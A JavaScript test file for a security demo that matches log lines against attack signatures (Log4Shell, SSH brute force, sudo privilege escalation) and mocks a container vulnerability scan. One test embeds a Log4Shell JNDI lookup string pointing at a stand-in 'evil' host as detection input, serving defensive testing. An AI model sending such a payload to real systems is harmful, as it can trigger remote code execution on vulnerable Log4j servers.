import { test } from 'node:test';
import assert from 'node:assert/strict';
import { mkdtempSync, readFileSync, rmSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import {
  SecurityDemo,
  buildVocabulary,
  embedEvent,
  embedSignature,
  parseLogLines,
  DEFAULT_LOG_LINES,
  DEFAULT_SIGNATURES,
} from '../../../dist/demos/security-demo.js';

function tmpReport() {
  const dir = mkdtempSync(join(tmpdir(), 'doge-demo-'));
  return { dir, path: join(dir, 'cybersecurity-demo-report.md') };
}

function cleanup(dir) {
  rmSync(dir, { recursive: true, force: true });
}

function makeInMemoryStore() {
  const state = new Map();
  return {
    backend: 'chroma',
    calls: [],
    async ensureCollection(name, _dim) {
      this.calls.push({ op: 'ensure', name });
      if (!state.has(name)) state.set(name, new Map());
      return { ok: true };
    },
    async upsert(name, points) {
      this.calls.push({ op: 'upsert', name, count: points.length });
      const col = state.get(name) ?? new Map();
      for (const p of points) col.set(p.id, p);
      state.set(name, col);
      return { ok: true };
    },
    async search(name, req) {
      this.calls.push({ op: 'search', name });
      const col = state.get(name) ?? new Map();
      let best = null;
      let bestScore = -Infinity;
      for (const point of col.values()) {
        let s = 0;
        const len = Math.min(point.vector.length, req.vector.length);
        for (let i = 0; i < len; i++) s += point.vector[i] * req.vector[i];
        if (s > bestScore) {
          bestScore = s;
          best = { id: point.id, score: s, payload: point.payload };
        }
      }
      return { ok: true, matches: best ? [best] : [] };
    },
    async deleteByIds() {
      return { ok: true };
    },
  };
}

test('buildVocabulary indexes every distinct signature keyword', () => {
  const vocab = buildVocabulary(DEFAULT_SIGNATURES);
  // Three signatures, some shared keywords (authentication failure).
  const keywords = new Set();
  for (const s of DEFAULT_SIGNATURES) for (const k of s.keywords) keywords.add(k.toLowerCase());
  assert.equal(vocab.dim, keywords.size);
});

test('embedSignature produces a unit-norm multi-hot keyword vector', () => {
  const vocab = buildVocabulary(DEFAULT_SIGNATURES);
  const vec = embedSignature(DEFAULT_SIGNATURES[0], vocab);
  assert.equal(vec.length, vocab.dim);
  const norm = Math.hypot(...vec);
  assert.ok(Math.abs(norm - 1) < 1e-9, `norm=${norm}`);
});

test('embedEvent activates only dimensions whose keyword appears in the message', () => {
  const vocab = buildVocabulary(DEFAULT_SIGNATURES);
  const v = embedEvent('GET /?q=${jndi:ldap://evil}', vocab);
  const jndiIdx = vocab.keywordIndex.get('jndi');
  const sshdIdx = vocab.keywordIndex.get('sshd');
  assert.ok(jndiIdx !== undefined && v[jndiIdx] > 0, 'jndi dimension should be active');
  assert.ok(sshdIdx !== undefined && v[sshdIdx] === 0, 'sshd dimension should not be active');
});

test('parseLogLines classifies Log4Shell jndi payload as critical', () => {
  const events = parseLogLines([DEFAULT_LOG_LINES[0]]);
  assert.equal(events.length, 1);
  assert.equal(events[0].severity, 'critical');
  assert.match(events[0].message, /jndi:ldap/);
});

test('parseLogLines classifies nginx baseline GET as info', () => {
  const events = parseLogLines([DEFAULT_LOG_LINES[1]]);
  assert.equal(events[0].severity, 'info');
});

test('parseLogLines extracts host and process from syslog-style line', () => {
  const events = parseLogLines(['2026-04-18T10:02:03Z bastion sshd[4421]: Failed password for root']);
  assert.equal(events[0].host, 'bastion');
  assert.match(events[0].process, /^sshd/);
  assert.equal(events[0].severity, 'critical');
});

test('SecurityDemo runs all four stages and writes a markdown report', async () => {
  const store = makeInMemoryStore();
  let scanCalls = 0;
  const containerScan = async () => {
    scanCalls += 1;
    return {
      ok: true,
      output: 'grype: 2 vuln(s) in alpine:3.14 | HIGH=1 LOW=1\n  [HIGH] CVE-2021-44228 log4j-core@2.14.0 fix=2.15.0\n  [LOW] CVE-2022-0001 busybox@1.32.0',
    };
  };
  const { dir, path } = tmpReport();
  try {
    const demo = new SecurityDemo({
      store,
      containerScan,
      reportPath: path,
      image: 'alpine:3.14',
      now: () => new Date('2026-04-18T12:00:00Z'),
    });
    const result = await demo.run();
    assert.equal(result.ok, true);
    assert.equal(scanCalls, 1);
    assert.equal(store.calls[0].op, 'ensure');
    assert.equal(store.calls[1].op, 'upsert');
    assert.equal(store.calls[1].count, 3);
    assert.ok(store.calls.some((c) => c.op === 'search'));

    const md = readFileSync(path, 'utf8');
    assert.match(md, /# Cybersecurity E2E Smoke Demo Report/);
    assert.match(md, /Stage 1 — Seed attack signatures/);
    assert.match(md, /Stage 2 — Parse short-term log feed/);
    assert.match(md, /Stage 3 — Correlate/);
    assert.match(md, /Stage 4 — Container vulnerability scan/);
    assert.match(md, /sig-log4shell/);
    assert.match(md, /grype: 2 vuln/);

    assert.equal(result.stages.length, 4);
    assert.ok(result.stages.every((s) => s.ok));

    const hasLog4shell = result.findings.some(
      (f) => f.signature?.id === 'sig-log4shell',
    );
    const hasSsh = result.findings.some(
      (f) => f.signature?.id === 'sig-ssh-bruteforce',
    );
    const hasPrivesc = result.findings.some(
      (f) => f.signature?.id === 'sig-privesc-sudo',
    );
    assert.ok(hasLog4shell, 'expected Log4Shell correlation');
    assert.ok(hasSsh, 'expected SSH brute force correlation');
    assert.ok(hasPrivesc, 'expected sudo privesc correlation');
  } finally {
    cleanup(dir);
  }
});

test('SecurityDemo records a warning when vector store is unavailable', async () => {
  const { dir, path } = tmpReport();
  try {
    // No store configured and no env vars => skip seeding and rely on in-mem fallback.
    delete process.env.CHROMA_URL;
    delete process.env.DOGE_DEMO_CHROMA_URL;
    const demo = new SecurityDemo({
      reportPath: path,
      containerScan: async () => ({ ok: true, output: 'grype: 0 vuln' }),
    });
    const result = await demo.run();
    const seed = result.stages.find((s) => s.name === 'seed-memory');
    assert.ok(seed);
    assert.equal(seed.ok, false);
    // The correlation stage should still succeed via the in-memory fallback.
    const correlate = result.stages.find((s) => s.name === 'correlate');
    assert.ok(correlate?.ok);
  } finally {
    cleanup(dir);
  }
});

test('SecurityDemo surfaces container scan errors in the report', async () => {
  const { dir, path } = tmpReport();
  try {
    const demo = new SecurityDemo({
      store: makeInMemoryStore(),
      reportPath: path,
      containerScan: async () => ({
        ok: false,
        output: '',
        error: 'grype binary not found',
      }),
    });
    const result = await demo.run();
    const scan = result.stages.find((s) => s.name === 'container-scan');
    assert.equal(scan?.ok, false);
    assert.match(scan?.detail ?? '', /grype binary not found/);
    const md = readFileSync(path, 'utf8');
    assert.match(md, /grype binary not found/);
  } finally {
    cleanup(dir);
  }
});
